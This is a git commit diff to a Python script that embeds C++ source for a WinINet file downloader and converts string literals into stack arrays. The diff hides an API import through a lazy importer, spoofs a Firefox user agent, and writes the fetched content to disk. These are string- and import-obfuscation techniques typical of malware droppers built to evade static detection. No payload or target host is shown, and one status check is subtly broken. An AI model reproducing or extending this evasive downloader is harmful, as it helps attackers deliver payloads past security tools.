8cdd579f398dd05ecd6ab2dd5a7283d2dfaa0696
throne <throne@throne.com>
2024-01-22 13:09:07 +0300

    t

--- inline_strings_in_cpp.py
+++ inline_strings_in_cpp.py
@@ -9,8 +9,10 @@ cpp_code = r"""__declspec(noinline, safebuffers) bool DownloadFile(const char* U
     char schemeUrl[1024] = { 0 };
     char fileUrlPath[1024] = { 0 };
     char userName[1024] = { 0 };
-
     URL_COMPONENTSA urlcomponents;
+
+    RtlZeroMemory(&urlcomponents, sizeof urlcomponents);
+
     urlcomponents.dwStructSize = sizeof(URL_COMPONENTS);
     urlcomponents.dwHostNameLength = 1024;
     urlcomponents.dwPasswordLength = 1024;
@@ -25,42 +27,65 @@ cpp_code = r"""__declspec(noinline, safebuffers) bool DownloadFile(const char* U
     urlcomponents.lpszUrlPath = fileUrlPath;
     urlcomponents.lpszUserName = userName;
 
-    LOG(InternetCrackUrlA(URL, strlen(URL), 0, &urlcomponents));
 
-    LOG(urlcomponents.lpszExtraInfo);
-    LOG(urlcomponents.lpszHostName);
-    LOG(urlcomponents.lpszPassword);
-    LOG(urlcomponents.lpszScheme);
-    LOG(urlcomponents.lpszUrlPath);
-    LOG(urlcomponents.lpszUserName);
-    LOG(urlcomponents.nPort);
+
+    ASSERT(LI_FN(InternetCrackUrlA)(URL, strlen(URL), 0, &urlcomponents));
+
 
     DWORD dwRequestFlags = (strcmp(urlcomponents.lpszScheme, "https") == 0) ? INTERNET_FLAG_SECURE : 0;
 
     HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 
+    ASSERT(hInternet)
+
     HINTERNET hConnect = InternetConnectA(hInternet, urlcomponents.lpszHostName, urlcomponents.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+
+    ASSERT(hConnect)
 
     HINTERNET hRequest = HttpOpenRequestA(hConnect, NULL, urlcomponents.lpszUrlPath, "HTTP/1.0", NULL, NULL, dwRequestFlags, 0);
 
-    BOOL bSendRequest = HttpSendRequestA(hRequest, NULL, 0, NULL, NULL);
+    ASSERT(hRequest)
 
-    char buffer[1024] = {'\00'};
+    ASSERT(HttpSendRequestA(hRequest, NULL, 0, NULL, NULL));
+
+    DWORD statusCode = 0;
+    DWORD length = sizeof(DWORD);
+    ASSERT(HttpQueryInfoA(
+        hRequest,
+        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
+        &statusCode,
+        &length,
+        NULL
+    ));
+
+    if (!(200 <= statusCode < 400))
+        return false;
+
+
+
+    HANDLE hFile = CreateFileA(
+        OutPath,
+        GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE)
+        return false;
+
+
+    char buffer[1025] = {'\00'};
     DWORD wrt = 1;
     while (wrt)
     {
-        InternetReadFile(hRequest, buffer, sizeof buffer, &wrt);
+        ASSERT(InternetReadFile(hRequest, buffer, sizeof buffer - 1, &wrt));
         buffer[wrt] = 0;
         if (wrt)
-            cout << buffer << endl;
+            ASSERT(WriteFile(hFile, buffer, wrt, NULL, NULL));
     }
-
-    LOG(hInternet);
-    LOG(hConnect);
-    LOG(hRequest);
-    LOG(bSendRequest);
-    LOG(dwRequestFlags);
-
     return true;
 }"""
 
@@ -72,7 +97,7 @@ def inline_string(string):
     
     variable_name = string[:8].replace('/', '_').replace('+', '_').replace('-', '_').replace(chr(92), '_').replace('.', '_') + "_string"
     
-    result = f"    SIZE_T {variable_name}[{size // 8}];\n"
+    result = f"    SIZE_T {variable_name}[{size // 8}] = {chr(123)}{'0, '*(size//8)}{chr(125)};\n"
     
     idx = 0
 
